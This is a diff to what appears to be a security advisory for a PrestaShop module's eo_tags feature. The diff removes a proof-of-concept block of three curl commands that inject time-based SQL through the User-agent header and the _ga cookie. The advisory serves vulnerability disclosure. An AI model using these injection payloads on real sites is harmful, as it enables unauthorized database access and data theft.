@@ -48,14 +48,6 @@ From version 1.2.0 published on Nov 17, 2017 to 1.2.19 published on Oct 22, 2019
 * Obtain admin access
 * Technical and personal data leaks
 
-## Proof of concept
-
-```bash
-curl -v -H "User-agent:1','1');SELECT SLEEP(5);--" 'https://example.test/'
-curl -v -H "User-agent:1','1');SELECT SLEEP(5);--" 'https://example.test/?force_eo_tags_tracking=1'
-curl -v --cookie "PrestaShop-xyz" --cookie "_ga=1.1.1','1')%3BSELECT SLEEP(5)%3B--" 'https://example.test/order'
-```
-
 ## Patch 
 
 If present in `eo_tags.php`
